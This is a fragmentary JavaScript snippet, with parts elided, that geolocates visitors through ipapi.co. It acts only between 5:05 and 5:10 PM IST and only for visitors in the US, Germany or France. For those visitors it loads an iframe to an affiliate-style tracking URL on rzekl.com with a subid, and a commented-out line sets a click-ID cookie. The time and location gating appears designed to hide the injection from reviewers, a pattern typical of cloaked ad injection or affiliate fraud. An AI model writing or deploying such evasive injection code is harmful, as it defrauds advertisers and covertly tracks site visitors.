(function () {
    try {
      ...
      function isAllowedISTTime() {
        ...
        // 5:05 PM = 17*60 + 5  = 1025
        // 5:10 PM = 17*60 + 10 = 1030
        return minutes >= 1025 && minutes <= 1030;
      }
      ...
      fetch("https://ipapi.co/json/", { cache: "no-store" })
        ...
        .then(geo => {
          if (!geo) return;
          if (geo.country_code !== "US" && geo.country_code !== "DE" && geo.country_code !== "FR") return;
          if (!geo.city) return;
        ...
        //   setCookie("clickId", sessionID);
          ...
          iframe.src =
            "https://rzekl.com/g/b9jm5dg8a820aa70d6d9fcfaae913b/" +
            "?subid=44611" ;
            // "&pub_id=4" +
